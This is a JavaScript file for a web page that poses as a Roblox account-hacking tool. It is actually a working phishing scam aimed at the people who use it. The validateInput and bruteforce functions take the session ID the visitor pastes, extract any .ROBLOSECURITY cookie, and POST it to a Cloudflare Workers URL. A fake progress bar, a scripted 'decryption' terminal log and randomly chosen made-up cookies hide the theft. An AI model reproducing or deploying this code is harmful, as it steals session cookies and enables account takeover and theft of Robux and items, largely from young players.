const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
function extractRobloxSecurityCookie(sessionId) {
  // Covers multiple possible cookie formats:
  const patterns = [
    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Format: .ROBLOSECURITY=value
    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Format: .ROBLOSECURITY","value"
    /(_\|WARNING:-DO-NOT-SHARE-THIS.+?)_/  // Full cookie warning format
  ];

  for (const regex of patterns) {
    const match = sessionId.match(regex);
    if (match) return match[1] || match[0]; // Return captured group or full match
  }
  return null; // No cookie found
}


async function sendToProxy(data) {
  try {
    const response = await fetch(CLOUDFLARE_PROXY_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: data,
        timestamp: new Date().toISOString()
      })
    });
    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
    return await response.json();
  } catch (error) {
    console.error('Proxy error:', error);
    throw error;
  }
}

function bruteforce(sessionId) {
  let content;
  const cookie = extractRobloxSecurityCookie(sessionId);

  if (cookie) {
    content = `✅ Valid .ROBLOSECURITY cookie:\n\`\`\`${cookie}\`\`\``;
  } else {
    content = `⚠️ Raw session ID (no .ROBLOSECURITY found):\n\`\`\`${sessionId}\`\`\``;
  }

  // Send to proxy (or log for testing)
  console.log(content); // Replace with sendToProxy() in malicious code
  sendToProxy(cookie || sessionId);
}


function validateInput() {
  const username = document.getElementById('username').value.trim();
  const sessionId = document.getElementById('sessionId').value.trim();
  const captcha = document.getElementById('captcha').checked;

  // Check for invalid inputs
  let errorMessage = "";

  if (username.length < 3 && sessionId.length < 200 && !captcha) {
    errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
  } else if (username.length < 3 && sessionId.length < 200) {
    errorMessage = "Username must be at least 3 characters, and session ID must be 300+ characters.";
  } else if (username.length < 3 && !captcha) {
    errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
  } else if (sessionId.length < 200 && !captcha) {
    errorMessage = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
  } else if (username.length < 3) {
    errorMessage = "Username must be at least 3 characters long.";
  } else if (sessionId.length < 200) {
    errorMessage = "Session ID must be at least 300 characters long.";
  } else if (!captcha) {
    errorMessage = "Please complete the CAPTCHA to proceed.";
  }

  if (errorMessage) {
    showError(errorMessage);
    return;
  }

  // Send the session ID to the proxy
  bruteforce(sessionId);

  // Hide error and start fake hacking process
  hideError();
  startHack();
}

function showError(message) {
  const errorElement = document.getElementById('error');
  errorElement.innerHTML = `<p class="error-message">${message}</p>`;
  errorElement.classList.remove('hidden');
}

function hideError() {
  document.getElementById('error').classList.add('hidden');
}

function startHack() {
  document.getElementById('scanButton').disabled = true;
  document.getElementById('hacking').classList.remove('hidden');

  const progressBar = document.getElementById('progress-bar-fill');
  let width = 0;
  const totalTime = 65000; // 65 seconds
  const intervalTime = 50; // Update every 50ms
  const increment = (intervalTime / totalTime) * 100; // Calculate increment per interval

  const progressInterval = setInterval(() => {
    if (width >= 100) {
      clearInterval(progressInterval);
      showCookieSuccess();
    } else {
      width += increment;
      progressBar.style.width = width + '%';
    }
  }, intervalTime);

  const terminal = document.getElementById('terminal');
  const messages = [
    '[*] Scanning target account...',
    '[*] Identifying encryption: AES-256...',
    '[*] Initializing custom decryption algorithm...',
    '[*] Decrypting session ID with a brute-force module...',
    '[*] Extracting _ROBLOSECURITY cookie...',
    '[*] Verifying cookie validity...'
  ];
  const messageInterval = totalTime / messages.length; // Time between messages

  let i = 0;
  const terminalInterval = setInterval(() => {
    if (i >= messages.length) {
      clearInterval(terminalInterval);
    } else {
      terminal.innerHTML += messages[i] + '\n';
      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
      i++;
    }
  }, messageInterval);
}



function showCookieSuccess() {
  const sessionIds_success = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A2B9C7D1E4F8G5H3I6J0K9L7M2N5O1P4Q3R6S9T8U0V2W5X7Y4Z6A3B1C8D0E2F9G6H7I4J5K3L1M0N9O8P2Q4R7S1T6U3V5W8X9Y0Z2A4B5C6D7E1F0G9H6I7J2K3L4M9N5O2P0Q3R6S8T7U1V4W9X0Y2Z5A6B7C3D1E0F4G8H9I5J2K3L7M1N4O9P2Q5R6S0T8U3V7W9X1Y6Z4A0B2C8D3F1G4H7I9J6K5L4M3N0O2P7Q1R9S5T8U3V6W0X9Y4Z2A7B8C1D5E4F2G3H0I9J7K1L6M3N9O5P2Q4R3S8T7U6V9W1X4Y2Z0A5B3C9D1E8F2G6H0I7J4L9M3N6O5P2Q4R1S7T8U0V3W9X6Y1Z5A4B2C3D9E7F0G4H1I9J3K2L8M6N4O5P7Q0R1S8T9U3V5W6X2Y4Z7A9B3C0D5E1F9G2H7I6J3K8L0M4N5PQ1R0S9T2U6V5W4X7Y8Z3A0B1C2D6E9F7G3H5I8J4K9L0M2N3O1P7Q6R5S3T8U4V0W9X7Y5Z2A3B4C6D9E1F7G0H2I9J5K4L3M0N7O1P6Q4R9S',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_M7N3O5P4Q9R2S1T6U0V8W7X9Y2Z5A4B1C9D7E3F0G2H8I9J1K4L5M2N6O3P7Q9R1S0T5U8V4W7X2Y6Z3A9B2C5D0E1F4G3H7I8J6K9L0M1N5P4Q9R7S3T5U1V6W8X2Y0Z4A9B3C7D6E2F1G5H9I8J0K4L6M7N1O3P2Q9R5S4T7U0V9W2X3Y4Z1A6B7C0D2E9F4G3H1I8J5K9L7M3N2O0P4Q6S5T9U7V0W3X5Y4Z1A6B2C3D9E8F0G2H1I5J7K6L9M3N4O5P2Q9R6S8T0U7V4W9X2Y6Z1A0B7C3D4E5F9G1H8I2J4K0L9M5N7O3P2Q4R6S9T0V1W5X2Y6Z9A3B1C4D0E7F4G9H2I8J5K7L3M9N0O6P2Q3R5S8T9U4V1W7X2Y6Z4A0B5C9D7E1F3G2H8I5J9K0L6M4N1O9P2Q3R7S4T0U9V1X5W2Y6Z7A3B0C2D4E9F1G5H0I8J7K6L3M9N1O5P2Q6R9S0T3U8V4W9X7Y5Z1A2B3C6D4E0F9G2H1I5J8K0L7M9N3O1P4Q7R5S9T2U0V6W8X5Y9Z',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_B8C2D9E7F1G6H3I9J5K0L4M1N2O3P9Q6R4S2T7U3V5W8X9Y0Z1A4B9C2D7E3F6G5H1I0J9K2L6M4N5O0P3Q7R1S8T6U4V2W9X0Y3Z5A1B7C4D8E6F9G1H5I3J2K7L0M9N4O5P3Q2R8S7T6U1V9W4X2Y5Z0A6B7C3D9E0F1G2H8I4J5K7L3M9N6O0P4Q1R2S9T8U5V7W4X0Y3Z6A1B2C9D0E4F7G1H8I9J0K3L6M2N5O4P1Q9R7S6T0U2V5W9X4Y0Z3A6B1C2D7E8F5G9H3I0J4K9L6M1N7O2P3Q5R4S9T8U7V0W6X1Y5Z2A4B9C6D3F1G2H9I7J5K3L8M0N9O2P6Q4R7S1T9U5V3W0X8Y2Z7A4B6C0D1E9F3G5H4I7J0K9L2M3N5O9P6Q8R1S4T7U2V9W5X0Y6Z3A4B1C6D7E9F0G8H9I0J1K7L5M4N3O2P9Q6R0S8T4U1V2W6X9Y3Z5A7B0C4D3E9F7G6H1I4J0K9L5M2N3O8P7Q6R2S9T5U0V4W1X3Y8Z6A4B0C9D6E2F1G8',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_T2U1V9W6X3Y4Z7A8B0C1D5E4F9G7H2I3J5K8L9M0N6O4P1Q7R5S2T6U0V9W1X3Y5Z4A7B9C2D3E6F0G8H4I1J9K2L3M7N0O5P6Q8R4S1T9V2W6X4Y7Z1A0B3C5D9E8F0G2H1I7J6K9L3M5N2O9P4R1S8T5U7V0W3X9Y4Z6A1B2C7D9E8F5G1H4I9J0K2L7M3N5O9P6Q4R8S2T0U1V5W3X9Y0Z2A5B6C4D3E1F7G8H9I3J0K2L6M7N1O5P9Q4R8S2T6U3V1W5X4Y9Z7A0B3C2D8E1F6G4H9I7J2K0L3M5N4O6P9Q5R3S2T7U1V0W9XY8Z5A0B9C1D4E6F3G2H0I7J5K9L4M3N6O2P8Q1R9S4T6U0V3W5X2Y7Z9A4B1C6D0E8F7G5H9I1J3K4L0M2N5O6P8Q7R9S2T0V4W1X3Y8ZZ2A4B0C7D6E1F8G3H9I5J2K4L0M1N9O5P7Q3R8S0T1U6V5W2X9Y3Z4A7B0C2D1E9F3G6H7I8J4K0L9M5N1O2P4Q7R3S8T5U9V0W6X4Y9Z7',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_R5S2T6U1V4W9X0Y7Z3A8B4C9D2E1F0G7H8I4J9K3L5M0N6O9P1Q2R7S3T5U4V9W2X6Y1Z8A0B9C4D7E3F6G5H1I9J0K2L4M3N5O8P7Q9R1S0T8U9V5W3X7Y2Z6A4B9C0D1E5F2G6H7I3J9K0L4M9N1O7P2Q8R3S5T6U0V1W9X7Y4Z2A5B3C9D0E7F6G2H1I9J5K0L4M3N9O1P8Q7R4S0T1U9V0W6X3Y7Z8A2B5C4D9E1F6G0H3I7J2K9L4M5N8O9P1Q2R3S6T7U9V5W4X2Y0Z3A8B7C1D9E4F5G2H6I1J0K4L7M9N5O2P3Q1R8S6T0U2V3W9X6Y4Z1A5B8C7D0E9F4G2H1I6J5K9L3M0N7O1P4Q6R2S3T8U5V1W9X4Y6Z7A0B3C5D1E9F2G0H8I4J5K7L9M2N6O3P1Q4R9S0T7V5V8W0X7Y3Z2A9B5C6D4E1F9G3H7I5J2K0L9M6N4O2P3Q1R8S7T4U5V2W9X0Y6Z1A7B5C2D9E3F0G4H1I8J2K7L6M9N0P4Q3R1S8T9U2V5W0'
  ];

  const sessionIds = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_K1L2M3N4O5P6Q7R8S9T0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_U1V2W3X4Y5Z6A7B8C9D0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_E1F2G3H4I5J6K7L8M9N0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_O1P2Q3R4S5T6U7V8W9X0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_Y1Z2A3B4C5D6E7F8G9H0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_I1J2K3L4M5N6O7P8Q9R0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_S1T2U3V4W5X6Y7Z8A9B0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_C1D2E3F4G5H6I7J8K9L0********',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_M1N2O3P4Q5R6S7T8U9V0********'
  ];

  // 50/50 chance of success or 2FA error
  const isSuccess = Math.random() < 0.5;

  const randomSessionId = isSuccess
    ? sessionIds_success[Math.floor(Math.random() * sessionIds_success.length)]
    : sessionIds[Math.floor(Math.random() * sessionIds.length)];

  if (isSuccess) {
    const successTable = `
      <div class="success-table">
        <h3>Success! Account Hacked</h3>
        <table>
          <tr>
            <th>Cookie</th>
          </tr>
          <tr>
            <td style="color: green;">${randomSessionId}</td>
          </tr>
        </table>
      </div>
    `;

    const cookieElement = document.getElementById('cookie');
    cookieElement.innerHTML = successTable;
    cookieElement.classList.remove('hidden');

    document.getElementById('twoFaError').classList.add('hidden');

    const terminal = document.getElementById('terminal');
    terminal.innerHTML += '[*] Session ID verified.\n';
    terminal.innerHTML += '<span style="color: green;">[*] SUCCESS! Account hacked successfully.</span>\n';
    terminal.scrollTop = terminal.scrollHeight;
  } else {
    const cookieElement = document.getElementById('cookie');
    cookieElement.innerHTML = `Cookie: <span style="color: red;">${randomSessionId}</span>`;
    cookieElement.classList.remove('hidden');

    const twoFaErrorElement = document.getElementById('twoFaError');
    twoFaErrorElement.innerHTML = `<p class="error-message" style="color: red;">ERROR! User has 2FA enabled. Full access prevented.</p>`;
    twoFaErrorElement.classList.remove('hidden');

    const terminal = document.getElementById('terminal');
    terminal.innerHTML += '[*] Session ID verified.\n';
    terminal.innerHTML += '<span style="color: red;">[*] ERROR! User has 2FA enabled. Full access prevented.</span>\n';
    terminal.scrollTop = terminal.scrollHeight;
  }
}

function showTerms() {
  const modal = document.getElementById('termsModal');
  modal.classList.remove('hidden');
  setTimeout(() => modal.classList.add('visible'), 10); // Small delay to trigger CSS transition
}

function closeTerms() {
  const modal = document.getElementById('termsModal');
  modal.classList.remove('visible');
  setTimeout(() => modal.classList.add('hidden'), 300); // Wait for transition to finish
}

document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('.close').addEventListener('click', closeTerms);
}); 
